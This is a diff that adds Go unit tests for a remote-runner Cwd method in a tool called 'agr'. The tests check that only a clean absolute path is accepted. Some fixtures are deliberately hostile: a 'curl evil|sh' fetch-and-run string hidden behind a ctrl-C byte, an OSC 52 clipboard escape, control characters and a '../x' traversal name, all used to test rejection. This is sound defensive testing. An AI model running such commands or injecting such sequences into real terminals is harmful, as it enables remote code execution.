@@ -331,3 +331,57 @@ func TestResolveAgrPathReturnsAbsolutePathAndRejectsBadHome(t *testing.T) {
 		})
 	}
 }
+
+func TestRunnerCwdReturnsAbsoluteDirOnly(t *testing.T) {
+	t.Helper()
+	dirs := pathstest.Dirs(t)
+	if err := SaveHostInfo(dirs, "host", HostInfo{Home: "/home/remote"}); err != nil {
+		t.Fatalf("SaveHostInfo() error = %v", err)
+	}
+	for _, tc := range []struct {
+		name string
+		body string
+		want string
+	}{
+		{name: "absolute", body: "agr\t1.0.0\n/srv/my repo\n", want: "/srv/my repo"},
+		{name: "empty", body: "agr\t1.0.0\n\n", want: ""},
+		{name: "header only", body: "agr\t1.0.0\n", want: ""},
+		{name: "relative", body: "agr\t1.0.0\nsrv\n", want: ""},
+		{name: "two lines", body: "agr\t1.0.0\n/a\n/b\n", want: ""},
+		{name: "ctrl-c and cr", body: "agr\t1.0.0\n/x\x03curl evil|sh\r\n", want: ""},
+		{name: "escape", body: "agr\t1.0.0\n/x\x1b]52;c;Zm9v\a\n", want: ""},
+		{name: "c1 control", body: "agr\t1.0.0\n/x\u009b31m\n", want: ""},
+		{name: "invalid utf-8", body: "agr\t1.0.0\n/x\xff\n", want: ""},
+		{name: "unicode and quote", body: "agr\t1.0.0\n/srv/café 'q'\n", want: "/srv/café 'q'"},
+		{name: "trailing space kept", body: "agr\t1.0.0\n/srv/x \n", want: "/srv/x "},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			ssh := &runnerSSH{body: []byte(tc.body)}
+			got, err := NewRunnerWithVersion(ssh, dirs, "1.0.0").Cwd(context.Background(), "host", "api")
+			if err != nil || got != tc.want {
+				t.Fatalf("Cwd() = (%q, %v), want (%q, nil)", got, err, tc.want)
+			}
+			calls := ssh.Calls(t)
+			want := []string{"/home/remote/.local/bin/agr", "cwd", "api"}
+			if len(calls) != 1 || !reflect.DeepEqual(calls[0].argv, want) {
+				t.Fatalf("argv = %+v, want %q", calls, want)
+			}
+		})
+	}
+}
+
+func TestRunnerCwdRejectsInvalidNameAndOldRemote(t *testing.T) {
+	t.Helper()
+	dirs := pathstest.Dirs(t)
+	if err := SaveHostInfo(dirs, "host", HostInfo{Home: "/home/remote"}); err != nil {
+		t.Fatalf("SaveHostInfo() error = %v", err)
+	}
+	ssh := &runnerSSH{body: []byte("agr 0.9 — remote session bridge\n"), err: &ExitError{Code: 2}}
+	runner := NewRunnerWithVersion(ssh, dirs, "1.0.0")
+	if _, err := runner.Cwd(context.Background(), "host", "../x"); err == nil {
+		t.Fatal("Cwd() with invalid name error = nil")
+	}
+	if _, err := runner.Cwd(context.Background(), "host", "api"); err == nil {
+		t.Fatal("Cwd() against a remote without the verb error = nil")
+	}
+}
